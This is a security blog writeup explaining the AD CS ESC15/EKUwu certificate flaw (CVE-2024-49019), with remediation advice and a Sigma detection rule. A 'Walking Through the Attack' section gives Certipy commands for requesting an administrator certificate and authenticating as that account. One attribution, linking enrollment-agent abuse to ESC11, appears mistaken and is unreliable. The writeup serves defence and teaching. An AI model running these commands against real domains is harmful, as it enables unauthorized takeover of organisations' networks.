---
layout: post
title:  "ESC15 / EKUwu: When a Certificate Template's EKU Is Just a Suggestion"
date:   2026-04-29 09:00:00 -0700
categories: writeup
tags: [ad-cs, active-directory, esc15, ekuwu, cve-2024-49019, privilege-escalation]
---

## TL;DR

In Active Directory Certificate Services (AD CS), schema version 1 certificate templates allow the certificate requester to specify Application Policy OIDs inside the CSR. Microsoft's AD CS implementation prefers the Application Policy over the standard Extended Key Usage (EKU) field configured on the template. The result is that an attacker with enrollment rights to any v1 template that lets the requester supply the subject (the default Web Server template fits this exactly) can request a certificate that ignores the template's intended purpose, embed Client Authentication into it, and then authenticate to the domain as any user, including Domain Admin. The vulnerability is tracked as CVE-2024-49019 and was patched in Microsoft's November 2024 Patch Tuesday update.

## Credit

This vulnerability was discovered and reported by Justin Bollinger at [TrustedSec](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) in late September 2024. He coined the name "EKUwu" as a portmanteau of EKU and the UwU emoticon. Microsoft assigned CVE-2024-49019 on November 12, 2024 and shipped the fix the same day. Everything that follows is my own analysis of the public material; the underlying discovery is his.

## A Brief Primer on AD CS Certificate Templates

For the rest of this post to make sense, it is worth a moment on what certificate templates do and why their schema version matters.

A certificate template is the blueprint AD CS uses to issue certificates. It defines who is allowed to enroll, what the resulting certificate is allowed to be used for (the Extended Key Usage, or EKU), how the subject of the certificate is determined (built from Active Directory or supplied by the requester), and a long list of cryptographic and policy details. When a user or computer requests a certificate, they pick a template, generate a CSR, and the CA produces a signed certificate that conforms to that template's rules.

Templates have a schema version. Version 1 templates are the original built-in templates that ship with AD CS and cannot be edited; they are baked into the schema. Version 2 and later templates can be created by administrators and customized. The set of v1 templates every AD CS deployment has includes Web Server, User, Computer, Subordinate Certification Authority, and a handful of others.

The EKU is the field that says "this certificate is for X." Common EKUs include Server Authentication (1.3.6.1.5.5.7.3.1), Client Authentication (1.3.6.1.5.5.7.3.2), and Code Signing (1.3.6.1.5.5.7.3.3). When a TLS server presents a certificate, the client checks for Server Authentication. When a Windows machine PKINIT-authenticates a user, the KDC checks for Client Authentication. EKU is what makes a certificate fit-for-purpose, and it is meant to be set by the template, not by the requester.

## What Is an Application Policy, and Why Does It Matter?

Here is the part most AD CS reference material does not make obvious. AD CS supports a second extension that does almost the same thing as EKU, called the Application Policy. It is a Microsoft-proprietary extension that predates the broad adoption of EKU in non-Windows certificate authorities. The two extensions encode the same kind of information using the same OID values for common purposes (Client Authentication, Server Authentication, and so on).

When AD CS issues a certificate, both extensions can be present. A subtle but load-bearing implementation choice in the AD CS issuance path is that when an Application Policy and an EKU disagree about what a certificate is for, AD CS uses the Application Policy and ignores the EKU.

The second piece of the puzzle is this: schema v1 templates allow the requester to include Application Policy OIDs in the CSR, and AD CS will respect them. Schema v2 and later templates do not. If a v1 template is cloned, the clone is automatically upgraded to v2, and the supply-your-own-Application-Policy capability is removed.

These two facts compose into the vulnerability.

## A Simple Example

Let's say an attacker has compromised a low-privileged Active Directory user account through a phishing campaign. The domain has AD CS deployed for internal HTTPS certificates, and the default Web Server template is published with enrollment permissions granted to Authenticated Users. This is a common configuration; Web Server is one of the templates most administrators publish to support internal TLS workflows.

A normal Web Server certificate request returns a certificate with Server Authentication EKU. Useful for hosting an HTTPS endpoint, useless for impersonating another user on the domain.

But what if the attacker submits a CSR that includes an Application Policy extension claiming Client Authentication? AD CS issues the certificate. The signing CA inserts the Server Authentication EKU it was supposed to (because that is what the template says), but it also inserts the Application Policy extension the attacker supplied. When any AD CS-respecting consumer of the certificate examines it, the Application Policy wins. The certificate is treated as a Client Authentication certificate.

Because the Web Server template allows the requester to supply the subject, the attacker also gets to choose whose identity the certificate represents. A subject of `CN=Administrator` produces a certificate that PKINIT-authenticates the attacker as the domain's built-in Administrator account.

This vulnerability is called ESC15, also known as EKUwu. It joined the existing roster of AD CS escalation primitives (ESC1 through ESC14) in late 2024.

## Walking Through the Attack

The practical exploit uses [Certipy](https://github.com/ly4k/Certipy), which gained Application Policy injection support via [PR #228 by dru1d-foofus](https://github.com/ly4k/Certipy/pull/228). Recent Certipy releases include the feature.

First, find vulnerable templates on the target domain. Certipy's `find` command, with the `-vulnerable` flag, surfaces ESC15-eligible templates:

```
certipy find -u 'lowpriv@target.local' -p 'password' \
  -dc-ip 10.10.10.10 -vulnerable
```

A typical result includes `WebServer` flagged with `[!] Vulnerabilities: ESC15`.

Next, request a certificate against the vulnerable template, supplying both an arbitrary subject and the Client Authentication application policy. Certipy's `req` subcommand accepts `-application-policies` (single hyphen, plural), with the value either an OID or a human-readable name; multiple policies can be passed space-separated.

```
certipy req \
  -u 'lowpriv@target.local' -p 'password' \
  -ca 'TARGET-CA' -target 'ca.target.local' \
  -template WebServer \
  -upn 'administrator@target.local' \
  -application-policies 'Client Authentication'
```

Certipy returns a `.pfx` containing the issued certificate and private key.

Authenticate as the target user with the certificate. PKINIT against the domain controller produces a TGT for `administrator@target.local`:

```
certipy auth -pfx administrator.pfx -domain target.local
```

The output is a `.ccache` file. From here the attacker has an Administrator TGT and can do whatever Administrator can do: dump the NTDS, push lateral, register a delegated MSA, and so on. This is full domain compromise from a low-privileged starting position, with no preexisting template misconfiguration beyond defaults.

## Beyond Client Authentication: Certificate Request Agent

The same primitive supports a second, even more impactful variant. Instead of injecting Client Authentication into the Application Policy, inject the Certificate Request Agent OID, `1.3.6.1.4.1.311.20.2.1`. This is the OID that designates a certificate as eligible to request certificates on behalf of other users, the building block of the older ESC11 attack.

The key target here is the User template, which is also a v1 template. A Certificate Request Agent certificate issued against the User template lets the attacker enroll arbitrary users for any certificate template the User template can request on behalf of, without having a properly configured enrollment-agent template anywhere in the environment. In effect, EKUwu manufactures an enrollment-agent capability that the administrator never published.

This is why ESC15 is more practical to exploit than most of its predecessors. ESC1 requires a misconfigured template that explicitly allows supply-the-subject and Client Authentication. ESC8 requires NTLM relay and the Web Enrollment endpoint. ESC11 requires a published enrollment-agent template. ESC15 requires only that AD CS is deployed and that any v1 template grants enrollment rights to your starting principal.

## Why This Is Practical

Three properties combine to make ESC15 unusually high-yield in real environments.

The default templates are vulnerable. Web Server, User, Computer, and several others are v1 templates. Most environments publish at least one of them. Many publish all of them.

The default permissions are permissive. Authenticated Users frequently has enrollment rights to one or more v1 templates, particularly Web Server in environments that use AD CS for internal HTTPS. Authenticated Users is the lowest-effort permission grant possible.

The fix is environment-specific. The November 2024 patch changes how AD CS handles Application Policy extensions in CSRs, but post-patch the operational followup is auditing for residual v1 templates that should be cloned and decommissioned. Patch deployment in large enterprises lags, and cloning v1 templates touches workflows that may not be well-documented.

The combined effect is that on any unpatched AD CS deployment with a v1 template enrollable by Authenticated Users, an attacker who lands a single low-privileged account is one Certipy invocation away from a Domain Admin TGT.

## Detection and Remediation

The patch is the primary control. Apply the November 2024 cumulative update on every certification authority. Microsoft's [security advisory for CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019) lists the affected and fixed builds for each Server SKU.

The longer-term fix is to retire schema v1 templates wherever possible. The simplest path is to clone the v1 template, which produces a v2 copy that is not vulnerable to ESC15, and then unpublish the v1 original. For the Web Server case specifically, replace the default with a custom v2 template that scopes enrollment permissions tighter than Authenticated Users.

For detection, audit AD CS issuance events for certificates whose Application Policy disagrees with the template's configured EKU. The relevant Windows event IDs are 4886 (certificate request received) and 4887 (certificate issued). A request that specifies a Client Authentication or Certificate Request Agent OID against a template configured for Server Authentication is a strong signal.

Microsoft Defender for Identity ships an [Edit overly permissive certificate template assessment](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-overly-permissive-template) that flags v1 templates with broad enrollment permissions. Run it after patching, and every quarter thereafter.

For offensive auditing, Certipy's `find` feature flags ESC15-vulnerable templates directly. SpecterOps' Certify and BloodHound also surface ESC15 paths. If you assess AD environments and have not added an ESC15 check post-November-2024 patch deployment, that is the exercise.

## A Starter Sigma Rule for EKUwu Attempts

The detection logic for EKUwu is straightforward in principle: a CSR submitted against a v1 template whose embedded Application Policy OID does not match the template's configured EKU is suspicious. The rule below is a starting point. AD CS event-field naming varies by Windows version, audit policy, and the SIEM normalizer in front of the event source, so before deploying it, validate the field paths against your own event data.

```yaml
title: AD CS Certificate Request With Mismatched Application Policy (ESC15 / EKUwu)
id: a-fresh-uuid-goes-here
status: experimental
description: >
    Detects a certificate request (event 4886) submitted against a schema
    version 1 certificate template where the requester-supplied Application
    Policy OID indicates an authentication-relevant purpose (Client
    Authentication or Certificate Request Agent) that disagrees with the
    template's configured EKU. This pattern is consistent with exploitation
    of CVE-2024-49019 (ESC15 / EKUwu) on unpatched AD CS deployments.
references:
    - https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019
author: Bruce Kang
date: 2026-04-29
logsource:
    product: windows
    service: security
detection:
    selection_event:
        EventID: 4886
    selection_app_policy_clientauth:
        Attributes|contains:
            - '1.3.6.1.5.5.7.3.2'      # Client Authentication
            - '1.3.6.1.4.1.311.20.2.1' # Certificate Request Agent
    selection_template_v1:
        # Adjust the right-hand list to the v1 template names published in
        # your environment. The defaults to start from are below.
        Attributes|contains:
            - 'CertificateTemplate:WebServer'
            - 'CertificateTemplate:User'
            - 'CertificateTemplate:Computer'
            - 'CertificateTemplate:Machine'
            - 'CertificateTemplate:DomainController'
    condition: selection_event and selection_app_policy_clientauth and selection_template_v1
falsepositives:
    - Legitimate enrollment workflows that intentionally request Client
      Authentication certificates against a v1 template (rare; investigate
      and tune accordingly).
    - Custom enrollment automation that submits non-default Application
      Policy values for compliance reasons.
level: high
tags:
    - attack.credential_access
    - attack.t1649
    - cve.2024.49019
```

A few notes on adapting this for a real deployment.

The `Attributes` field on Windows event 4886 is a multi-line blob whose exact serialization depends on the requesting client and the AD CS auditing configuration. Pull a sample event from your environment, find where the requested template name and the requested Application Policy OIDs land, and adjust the field path accordingly. In environments that run an event-forwarding pipeline (Microsoft Sentinel, Splunk, Elastic), the normalizer may have parsed these into separate fields, in which case the rule is cleaner and more precise.

The selection on template names is a deny-list of common defaults. The more rigorous version is an allow-list that names the v1 templates currently published in your environment, derived from `certutil -dstemplate`. Anything matching this rule that is not on the allow-list is worth triaging.

If you have post-patch telemetry, this rule should produce zero hits in normal operation. After the November 2024 patch, AD CS no longer respects requester-supplied Application Policy values on v1 templates, so any 4886 event matching the rule is either a misconfigured legitimate workflow (rare) or an exploitation attempt against an unpatched CA. Either is worth investigating.

## The Lesson That Generalizes

Two parallel metadata fields, each meant to express the same thing, with the security-relevant decision made by checking the wrong one. Microsoft's AD CS implementation has Application Policy and EKU; both encode "what this certificate is for"; the proprietary one wins. The class of bug is "the security check reads field A while the security-relevant decision uses field B."

The same shape recurs across the stack:

- HTTP request smuggling, where the front-end and back-end disagree on whether `Transfer-Encoding` or `Content-Length` defines the request boundary.
- File-format identification, where antivirus checks the file extension while the OS executes based on content-sniffed magic bytes.
- DKIM and email authentication, where the verifier can be steered to authenticate one part of the message while the user reads another.

The actionable rule is consistent. When a system has two ways to express the same property and a security check reads one of them, confirm which one the relying party actually consumes, and audit every code path that produces or consumes either form.

## Final Thoughts

AD CS misconfigurations remain one of the highest-yielding attack paths in modern domain takeovers, and ESC15 is notable because the default deployment is enough. There is no "this template is misconfigured" finding to write up; there is only "AD CS is deployed and a v1 template is enrollable by Authenticated Users." That covers a meaningful percentage of real environments.

If you are responsible for an AD CS deployment, the November 2024 patch and a v1-template audit are the two controls that matter. If you assess AD environments, ESC15 is now part of the standard enumeration. If you are investing time in understanding a single AD attack chain end-to-end, this is a good one to learn well: short, broadly applicable, and a clean illustration of how legacy compatibility extensions become security bugs when paired with too-permissive defaults.

## References

- [TrustedSec original disclosure: EKUwu, Not Just Another AD CS ESC](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [SpecterOps Certify docs: ESC15 (EKUwu) Application Policy Injection](https://docs.specterops.io/ghostpack-docs/Certify.wik-mdx/esc15-ekuwu-application-policy-injection)
- [Microsoft MSRC: CVE-2024-49019](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019)
- [AttackerKB: CVE-2024-49019](https://attackerkb.com/topics/DtcSlVQJPr/cve-2024-49019)
- [Certipy ESC15 support, ly4k/Certipy PR #228 (dru1d-foofus)](https://github.com/ly4k/Certipy/pull/228)
- [CyCraft technical analysis](https://www.cycraft.com/en/post/esc15-2024-49019-en-20250908)
- [Microsoft Defender for Identity: Edit overly permissive certificate template assessment](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-overly-permissive-template)
- [Hacking Articles: ADCS ESC15, Exploiting Template Schema v1](https://www.hackingarticles.in/adcs-esc15-exploiting-template-schema-v1/)
